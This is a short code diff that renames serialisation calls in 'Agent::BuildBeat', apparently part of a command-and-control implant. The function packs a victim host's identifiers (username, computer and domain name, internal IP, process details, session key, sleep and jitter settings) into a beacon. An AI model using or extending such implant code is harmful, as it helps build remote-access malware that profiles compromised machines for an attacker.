@@ -32,26 +32,26 @@ LPSTR Agent::BuildBeat()
 
 	Packer* packer = (Packer*) MemAllocLocal(sizeof(Packer));
 	*packer = Packer();
-	
-	packer->Add32(this->config->agent_type);
-	packer->Add32(this->info->agent_id);
-	packer->Add32(this->config->sleep_delay);
-	packer->Add32(this->config->jitter_delay);
-	packer->Add16(this->info->acp);
-	packer->Add16(this->info->oemcp);
-	packer->Add8(this->info->gmt_offest);
-	packer->Add16(this->info->pid);
-	packer->Add16(this->info->tid);
-	packer->Add32(this->info->build_number);
-	packer->Add8(this->info->major_version);
-	packer->Add8(this->info->minor_version);
-	packer->Add32(this->info->internal_ip);
-	packer->Add8( flag );
-	packer->AddBytes(this->config->session_key, 16);
-	packer->AddStringA(this->info->domain_name);
-	packer->AddStringA(this->info->computer_name);
-	packer->AddStringA(this->info->username);
-	packer->AddStringA(this->info->process_name);
+
+	packer->Pack32(this->config->agent_type);
+	packer->Pack32(this->info->agent_id);
+	packer->Pack32(this->config->sleep_delay);
+	packer->Pack32(this->config->jitter_delay);
+	packer->Pack16(this->info->acp);
+	packer->Pack16(this->info->oemcp);
+	packer->Pack8(this->info->gmt_offest);
+	packer->Pack16(this->info->pid);
+	packer->Pack16(this->info->tid);
+	packer->Pack32(this->info->build_number);
+	packer->Pack8(this->info->major_version);
+	packer->Pack8(this->info->minor_version);
+	packer->Pack32(this->info->internal_ip);
+	packer->Pack8( flag );
+	packer->PackBytes(this->config->session_key, 16);
+	packer->PackStringA(this->info->domain_name);
+	packer->PackStringA(this->info->computer_name);
+	packer->PackStringA(this->info->username);
+	packer->PackStringA(this->info->process_name);
 
 	PBYTE beat = packer->GetData();
 	ULONG beat_size = packer->GetDataSize();
